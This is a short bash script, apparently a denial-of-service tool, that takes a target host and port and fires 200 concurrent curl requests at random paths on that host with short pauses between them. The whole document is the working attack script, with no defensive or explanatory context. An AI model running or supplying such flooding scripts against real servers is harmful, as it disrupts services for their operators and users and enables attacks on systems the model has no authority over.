#!/usr/bin/env bash
	TARGET="${1}"
  PORT="${2}"
  function DOS() {
    STR=$( cat /dev/urandom | tr -dc "a-z0-9" | fold -w 16 | head -n 1 )
    curl "http://${TARGET}:${PORT}/${STR}" > /dev/null 2>&1
  }

if [ "${#}" -eq 2 ]; then
  for i in $( seq 1 200 ); do
    DOS & 
    if [ $(( i % 50 )) -eq 0 ]; then
      sleep 0.5
    fi
    sleep 0.1
  done
fi